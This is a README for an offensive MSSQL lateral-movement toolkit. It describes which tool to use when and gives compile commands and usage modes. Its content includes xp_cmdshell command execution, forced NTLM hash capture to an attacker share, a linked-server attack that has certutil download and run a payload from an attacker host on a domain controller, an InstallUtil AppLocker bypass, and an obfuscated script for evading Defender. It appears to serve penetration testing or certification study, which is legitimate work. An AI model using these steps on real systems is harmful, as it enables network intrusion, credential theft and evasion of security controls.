# mssql lateral movement

Six files with overlapping functionality — read the role table first, then pick the right tool for the job.

---

## File Roles

| File | Type | Standalone? | Role / When to use |
|------|------|-------------|--------------------|
| `sql-v2.cs` | C# source | Yes (compile) | **The main multi-tool.** Enumeration, xp_cmdshell, linked servers, hash force, OLE. Use this. |
| `PowerUpSQL.ps1` | PowerShell | Yes (run) | PS-based MSSQL enumeration and exploitation |
| `PowerupSQL_Obfuscated.ps1` | PowerShell | Yes (run) | Same as PowerUpSQL.ps1 but obfuscated (when Defender blocks the plain one) |
| `mssql-runner.cs` | C# source | Yes (compile) | Simple: enumerate + trigger NTLM hash. Subset of sql-v2.cs |
| `linked_server_rev_shell.cs` | C# source | Yes (compile) | Specific: linked server → xp_cmdshell → download+exec payload |
| `LinkedSQLPrivEscRevShell.cs` | C# source | Yes (compile) | Specific: linked server → privilege escalation → reverse shell |
| `smb_trigger.cs` | (in `windows/`) | Yes (compile) | Minimal: just trigger NTLM hash via xp_dirtree |

---

## Which to use?

```
Starting point: You have MSSQL access
│
├── Need to enumerate the environment first?
│   → PowerUpSQL.ps1 (broad PS-based enum)
│   → sql-v2.cs /e mode (C# enum)
│
├── Need to execute OS commands on the SQL server?
│   → sql-v2.cs /x mode (xp_cmdshell) or /o mode (OLE)
│
├── Found a linked SQL server?
│   → sql-v2.cs /f + /x modes (enable features + exec on linked server)
│   → linked_server_rev_shell.cs (automated: enable xp_cmdshell → download → exec)
│   → LinkedSQLPrivEscRevShell.cs (automated: priv esc + rev shell via linked server)
│
├── Just need the SQL service account hash?
│   → sql-v2.cs /h mode
│   → mssql-runner.cs (simpler)
│   → smb_trigger.cs (simplest)
│
└── Need impersonation testing?
    → See 07-active-directory/enumeration/ComprehensiveImpersonation.cs
```

---

## sql-v2.cs — The Main Tool

Compile once, use for everything.

**Compile — Visual Studio (Windows dev box):**
1. File → New → Console App (.NET Framework), name `sql`, .NET Framework 4.8
2. Paste `sql-v2.cs`, delete defaults
3. Right-click References → Add Reference → Assemblies → check **System.Data** → OK
4. Project → Properties → Build → Platform target: **x64**, ☑ Allow unsafe code
5. Build → Build Solution → `bin\x64\Debug\sql.exe`

**Alt (Windows cmd):** `csc.exe /unsafe /platform:x64 /r:System.Data.dll /out:sql.exe sql-v2.cs`

```cmd
:: InstallUtil bypass (if AppLocker blocks the .exe)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U sql.exe
```

**Modes:**
```bash
.\sql.exe /q                          # Query — find MSSQL SPNs in domain
.\sql.exe /e <SERVER>                 # Enumerate linked servers + permissions
.\sql.exe /c <SERVER> "<SQL_QUERY>"   # Run a SQL query
.\sql.exe /x <SERVER> "<OS_COMMAND>"  # xp_cmdshell
.\sql.exe /h <SERVER> \\<KALI>\share  # Force NTLM auth (hash capture)
```

---

## linked_server_rev_shell.cs — Automated Linked Server Attack

Hardcode your target linked server name and payload URL, compile, run:
```bash
# Edit the constants in the source:
#   string sqlServer = "appsrv01.corp.local";
#   string linkedServer = "DC01";
#   string payloadUrl = "http://<KALI_IP>/runner.exe";

# Compile — Visual Studio (Windows dev box):
#   File → New → Console App (.NET Framework), name "lsrs", .NET Framework 4.8
#   Paste linked_server_rev_shell.cs, delete defaults
#   Right-click References → Add Reference → Assemblies → check System.Data → OK
#   Project → Properties → Build → Platform target: x64, ☑ Allow unsafe code
#   Build → Build Solution → bin\x64\Debug\lsrs.exe
#   Alt: csc.exe /unsafe /platform:x64 /r:System.Data.dll /out:lsrs.exe linked_server_rev_shell.cs
.\lsrs.exe
```
What happens:
1. Connects to `appsrv01`
2. Enables `xp_cmdshell` on the linked server `DC01`
3. Runs `certutil` on DC01 to download your payload
4. Executes your payload on DC01

---

## PowerUpSQL.ps1 — Quick Enumeration

```powershell
Import-Module .\PowerUpSQL.ps1

# Find all MSSQL instances in the domain
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Find accessible instances
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

# Check for privilege escalation paths
Invoke-SQLAudit -Verbose
```

If Defender blocks the plain version, use `PowerupSQL_Obfuscated.ps1` instead — identical functionality.

---

## Notes

- All C# tools use Windows Integrated Authentication (current user's credentials) — no SQL username/password needed unless specified.
- `xp_cmdshell` is disabled by default on SQL Server but can be enabled with `sa` or `sysadmin` rights.
- Linked server attacks work because the linked server trust may have higher privileges than your direct connection.
